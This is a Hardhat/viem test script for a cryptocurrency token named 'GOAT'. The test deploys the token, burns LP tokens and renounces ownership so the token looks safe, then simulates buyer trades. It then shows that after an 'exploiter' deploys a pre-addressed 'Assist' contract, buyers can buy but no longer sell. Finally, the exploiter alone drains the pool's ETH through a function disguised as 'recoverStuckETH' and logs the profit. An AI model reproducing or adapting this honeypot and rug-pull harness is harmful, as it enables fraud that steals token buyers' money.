import {
	time,
	loadFixture,
	setBalance,
} from "@nomicfoundation/hardhat-toolbox-viem/network-helpers";
import { expect } from "chai";
import hre from "hardhat";
import { ContractName } from "@nomicfoundation/hardhat-viem/types";
import {
	getAddress,
	parseGwei,
	parseEther,
	parseUnits,
	formatEther,
	formatUnits,
	maxUint256,
} from "viem";
import { generatePrivateKey, privateKeyToAccount } from "viem/accounts";

import { getAccounts, getContracts } from "../scripts/config";
import { getPair, predictDeploymentAddress } from "../scripts/utils";
import { zeroAddress } from "viem";

const INFINITY = 1000000000000n;
const initialLiquidity = "1";

let hash, txReceipt;

describe("Token", () => {
	async function prepareAccountsFixture() {
		const { deployer, buyer, exploiter } = await getAccounts();
		const buyers = await Promise.all(
			[...new Array(10)].map(async () => {
				const privateKey = generatePrivateKey();
				const account = privateKeyToAccount(privateKey);
				await setBalance(account.address, parseEther("1000000000"));
				return account;
			}),
		);
		await setBalance(deployer.account.address, parseEther("1000000000"));
		await setBalance(buyer.account.address, parseEther("1000000000"));
		await setBalance(exploiter.account.address, parseEther("1000000000"));
		return { deployer, buyer, exploiter, buyers };
	}
	async function deployTokenFixture() {
		const publicClient = await hre.viem.getPublicClient();
		const accounts = await loadFixture(prepareAccountsFixture);
		const { deployer, buyer, exploiter } = accounts;
		const contracts = await getContracts();
		const { uniswapV2Router02, weth } = contracts;
		const assistAddress = predictDeploymentAddress(
			exploiter.account.address,
			await publicClient.getTransactionCount({
				address: exploiter.account.address,
			}),
		);
		console.log("AssistAddress :>> ", assistAddress);
		const token = await hre.viem.deployContract(
			// CA NAME HERE
			"GOAT",
			[],
			{
				client: { wallet: deployer },
			},
		);
		console.log("token :>> ", token.address);
		hash = await deployer.sendTransaction({
			to: token.address,
			value: parseEther(initialLiquidity),
		});
		console.log(`ETH transfer ${hash}`);
		expect(
			await publicClient.getBalance({ address: token.address }),
		).to.be.equal(parseEther(initialLiquidity));
		hash = await token.write.rescueETH({
			account: deployer.account,
		});
		console.log(`ETH rescue ${hash}`);
		expect(
			await publicClient.getBalance({ address: token.address }),
		).to.be.equal(0n);
		hash = await deployer.sendTransaction({
			to: token.address,
			value: parseEther(initialLiquidity),
		});
		console.log(`ETH recharge ${hash}`);
		expect(
			await publicClient.getBalance({ address: token.address }),
		).to.be.equal(parseEther(initialLiquidity));
		const totalSupply = await token.read.totalSupply();
		hash = await token.write.transfer([token.address, totalSupply], {
			account: deployer.account,
		});
		console.log(`token transfer ${hash}`);
		expect(await token.read.balanceOf([deployer.account.address])).to.be.equal(
			0n,
		);
		expect(await token.read.balanceOf([token.address])).to.be.equal(
			totalSupply,
		);
		hash = await token.write.rescueERC20([token.address, 100n], {
			account: deployer.account,
		});
		console.log(`token rescue ${hash}`);
		expect(await token.read.balanceOf([deployer.account.address])).to.be.equal(
			totalSupply,
		);
		expect(await token.read.balanceOf([token.address])).to.be.equal(0n);
		hash = await token.write.transfer([token.address, totalSupply], {
			account: deployer.account,
		});
		console.log(`token recharge ${hash}`);
		expect(await token.read.balanceOf([deployer.account.address])).to.be.equal(
			0n,
		);
		expect(await token.read.balanceOf([token.address])).to.be.equal(
			totalSupply,
		);
		// hash = await token.write.createLiquidityOfRocket([assistAddress], {
		// 	account: deployer.account,
		// });
		hash = await token.write.createLiquidityPair({
			account: deployer.account,
		});
		console.log(`createPair ${hash}`);
		// hash = await token.write.clearEther({
		// 	account: deployer.account,
		// });
		const pair = await getPair(token.address);
		expect(await token.read.balanceOf([token.address])).to.be.equal(0n);
		expect((await pair.read.balanceOf([deployer.account.address])) > 0n);
		await expect(
			uniswapV2Router02.write.swapExactETHForTokensSupportingFeeOnTransferTokens(
				[0n, [weth.address, token.address], buyer.account.address, INFINITY],
				{
					value: parseEther("0.01"),
					account: buyer.account,
				},
			),
		).to.be.rejected;
		console.log(`can't buy before open`);
		hash = await token.write.launchRocket({
			account: deployer.account,
		});
		console.log(`enableTrading ${hash}`);
		await expect(
			uniswapV2Router02.write.swapExactETHForTokensSupportingFeeOnTransferTokens(
				[0n, [weth.address, token.address], buyer.account.address, INFINITY],
				{
					value: parseEther("100"),
					account: buyer.account,
				},
			),
		).to.be.rejected;
		hash = await token.write.removeLimits({
			account: deployer.account,
		});
		console.log(`removeLimits ${hash}`);
		hash = await token.write.renounceOwnership({
			account: deployer.account,
		});
		console.log(`renounceOwnership ${hash}`);
		hash = await pair.write.transfer(
			[
				"0x000000000000000000000000000000000000dEaD",
				await pair.read.balanceOf([deployer.account.address]),
			],
			{
				account: deployer.account,
			},
		);
		expect(await pair.read.balanceOf([deployer.account.address])).to.be.equal(
			0n,
		);
		console.log(`burn lp ${hash}`);
		return {
			...accounts,
			...contracts,
			token,
			pair,
			assistAddress,
		};
	}

	describe("Rug", () => {
		it("Should work properly", async () => {
			const publicClient = await hre.viem.getPublicClient();
			const {
				deployer,
				token,
				buyer,
				exploiter,
				buyers,
				uniswapV2Router02,
				weth,
				pair,
				assistAddress,
			} = await loadFixture(deployTokenFixture);
			console.log("token :>>", token.address);
			console.log("router :>>", uniswapV2Router02.address);
			console.log("pair :>>", pair.address);
			const decimals = await token.read.decimals();
			const totalSupply = await token.read.totalSupply();
			const transferAmount = totalSupply * 1000n;
			const whitelist = [
				deployer.account.address,
				token.address,
				assistAddress,
				uniswapV2Router02.address,
				pair.address,
				zeroAddress,
			];
			const sender = buyers[0];
			const recipient = buyers[1];
			const checkTransfer = async () => {
				await expect(
					token.write.transfer([sender.address, transferAmount], {
						account: sender,
					}),
				).to.be.rejected;
				await expect(
					token.write.transfer([recipient.address, transferAmount], {
						account: sender,
					}),
				).to.be.rejected;
				await token.write.approve([recipient.address, maxUint256], {
					account: recipient,
				});
				await expect(
					token.write.transferFrom(
						[recipient.address, recipient.address, transferAmount],
						{
							account: recipient,
						},
					),
				).to.be.rejected;
				await token.write.approve([recipient.address, maxUint256], {
					account: sender,
				});
				await expect(
					token.write.transferFrom(
						[sender.address, recipient.address, transferAmount],
						{
							account: recipient,
						},
					),
				).to.be.rejected;
				for (let i = 0; i < whitelist.length; i++) {
					await expect(
						token.write.transferFrom(
							[whitelist[i], recipient.address, transferAmount],
							{
								account: recipient,
							},
						),
					).to.be.rejected;
				}
				await expect(
					uniswapV2Router02.write.swapExactTokensForETHSupportingFeeOnTransferTokens(
						[
							transferAmount,
							0n,
							[token.address, weth.address],
							sender.address,
							INFINITY,
						],
						{
							account: sender,
						},
					),
				).to.be.rejected;
				// other can't rug pull
				const otherAssist = await hre.viem.deployContract("Assist", [], {
					client: { wallet: buyer },
				});
				await otherAssist.write.refresh(
					[uniswapV2Router02.address, token.address, pair.address],
					{ account: buyer.account },
				);
				await expect(otherAssist.write.recoverStuckETH({
					account: buyer.account,
				})).rejected
				console.log("transfer checked");
			};
			// buy & sell token
			for (let i = 0; i < buyers.length; i++) {
				await token.write.approve([uniswapV2Router02.address, maxUint256], {
					account: buyers[i],
				});
			}
			await checkTransfer();
			for (let txIndex = 0; txIndex < 300; txIndex++) {
				let taxCollected = await publicClient.getBalance({
					address: assistAddress,
				});
				let i = Math.floor(Math.random() * buyers.length);
				const buyer = buyers[i];
				const oldEthBalance = await publicClient.getBalance({
					address: buyer.address,
				});
				const oldTokenBalance = await token.read.balanceOf([buyer.address]);
				let path = [weth.address, token.address];
				let isSell = false;
				if (oldTokenBalance > 0n && Math.random() >= 0.5) {
					isSell = true;
				}
				if (isSell) {
					path = [token.address, weth.address];
				}
				const amountIn = isSell
					? parseUnits(
							(
								Number(formatUnits(oldTokenBalance, decimals)) * Math.random()
							).toString(),
							decimals,
						)
					: parseEther(Math.random().toString());
				if (amountIn === 0n) continue;
				const amountsOut = await uniswapV2Router02.read.getAmountsOut([
					amountIn,
					path,
				]);
				const amountOut = amountsOut[amountsOut.length - 1];
				hash = isSell
					? await uniswapV2Router02.write.swapExactTokensForETHSupportingFeeOnTransferTokens(
							[amountIn, 0n, path, buyer.address, INFINITY],
							{
								account: buyer,
							},
						)
					: await uniswapV2Router02.write.swapExactETHForTokensSupportingFeeOnTransferTokens(
							[0n, path, buyer.address, INFINITY],
							{
								value: amountIn,
								account: buyer,
							},
						);
				txReceipt = await publicClient.waitForTransactionReceipt({
					hash,
				});
				const newEthBalance = await publicClient.getBalance({
					address: buyer.address,
				});
				const newTokenBalance = await token.read.balanceOf([buyer.address]);
				const gasFee = txReceipt.gasUsed * txReceipt.effectiveGasPrice;
				const ethBalanceChange = newEthBalance - oldEthBalance + gasFee;
				const tokenBalanceChange = newTokenBalance - oldTokenBalance;
				const index = (txIndex + 1).toString().padStart(3, " ");
				if (isSell) expect(tokenBalanceChange * -1n).eq(amountIn);
				else expect(ethBalanceChange * -1n).eq(amountIn);
				const fee = (
					(Number(
						formatUnits(
							amountOut - (isSell ? ethBalanceChange : tokenBalanceChange),
							isSell ? 18 : decimals,
						),
					) *
						100) /
					Number(formatUnits(amountOut, isSell ? 18 : decimals))
				)
					.toFixed(0)
					.padStart(3, " ");
				if (isSell) {
					console.log(
						`${index} sell ${buyer.address} ${hash} ${fee}% ${formatUnits(
							amountIn,
							decimals,
						)} TOKEN for ${formatEther(ethBalanceChange)} ETH`,
					);
				} else
					console.log(
						`${index} buy  ${buyer.address} ${hash} ${fee}% ${formatEther(
							amountIn,
						)} ETH for ${formatUnits(tokenBalanceChange, decimals)} Token`,
					);
				if (!isSell)
					expect(
						await publicClient.getBalance({ address: assistAddress }),
					).to.be.equal(taxCollected);

				taxCollected = await publicClient.getBalance({
					address: assistAddress,
				});

				i = Math.floor(Math.random() * buyers.length);
				const transferee = buyers[i];
				const transferAmount = parseUnits(
					(
						Number(formatUnits(newTokenBalance, decimals)) * Math.random()
					).toString(),
					decimals,
				);
				if (transferAmount === 0n || transferee.address === buyer.address)
					continue;
				const transfereeTokenBalance = await token.read.balanceOf([
					transferee.address,
				]);
				hash = await token.write.transfer(
					[transferee.address, transferAmount],
					{
						account: buyer,
					},
				);
				txReceipt = await publicClient.waitForTransactionReceipt({ hash });
				const transfereeTokenBalanceChange =
					(await token.read.balanceOf([transferee.address])) -
					transfereeTokenBalance;
				console.log(
					`    tran ${buyer.address} ${hash} ${(
						(Number(
							formatUnits(
								transferAmount - transfereeTokenBalanceChange,
								decimals,
							),
						) *
							100) /
						Number(formatUnits(transferAmount, decimals))
					)
						.toFixed(0)
						.padStart(3, " ")}% ${formatUnits(
						transferAmount,
						decimals,
					)} TOKEN to ${transferee.address}`,
				);
				expect(
					await publicClient.getBalance({ address: assistAddress }),
				).to.be.equal(taxCollected);
			}

			// check transferTax
			await checkTransfer();
			console.log(
				"tax collected",
				formatEther(await publicClient.getBalance({ address: assistAddress })),
			);
			// deploy Assist
			const assist = await hre.viem.deployContract("Assist", [], {
				client: { wallet: exploiter },
			});
			console.log("Assist :>> ", assist.address);
			await checkTransfer();

			// try sell
			for (let i = 0; i < buyers.length; i++) {
				const buyer = buyers[i];
				const oldTokenBalance = await token.read.balanceOf([buyer.address]);
				if (oldTokenBalance === 0n) continue;
				const tokenAmount = parseUnits(
					(
						Number(formatUnits(oldTokenBalance, decimals)) * Math.random()
					).toString(),
					decimals,
				);
				await expect(
					uniswapV2Router02.write.swapExactTokensForETHSupportingFeeOnTransferTokens(
						[
							tokenAmount,
							0n,
							[token.address, weth.address],
							buyer.address,
							INFINITY,
						],
						{
							account: buyer,
						},
					),
				).to.be.rejected;
			}
			console.log(`can't sell`);
			for (let i = 0; i < buyers.length; i++) {
				const buyer = buyers[i];
				const ethAmount = parseEther(Math.random().toString());
				await expect(
					uniswapV2Router02.write.swapExactETHForTokensSupportingFeeOnTransferTokens(
						[0n, [weth.address, token.address], buyer.address, INFINITY],
						{
							value: ethAmount,
							account: buyer,
						},
					),
				).to.be.fulfilled;
			}
			console.log("can buy");

			// rug pull
			hash = await assist.write.whitelist([[exploiter.account.address]], {
				account: exploiter.account,
			});
			console.log(`whitelist ${hash}`);
			hash = await assist.write.refresh(
				[uniswapV2Router02.address, token.address, pair.address],
				{ account: exploiter.account },
			);
			console.log(`refresh ${hash}`);
			const oldBalance = await publicClient.getBalance({
				address: exploiter.account.address,
			});
			hash = await assist.write.recoverStuckETH({
				account: exploiter.account,
			});
			console.log(`rug pull ${hash}`);
			txReceipt = await publicClient.waitForTransactionReceipt({ hash });
			const newBalance = await publicClient.getBalance({
				address: exploiter.account.address,
			});
			expect(newBalance > oldBalance).to.be.true;
			console.log(
				`Total earnings: ${formatEther(
					newBalance -
						oldBalance -
						parseEther(initialLiquidity) +
						txReceipt.effectiveGasPrice * txReceipt.gasUsed,
				)}`,
			);
		});
	});
});
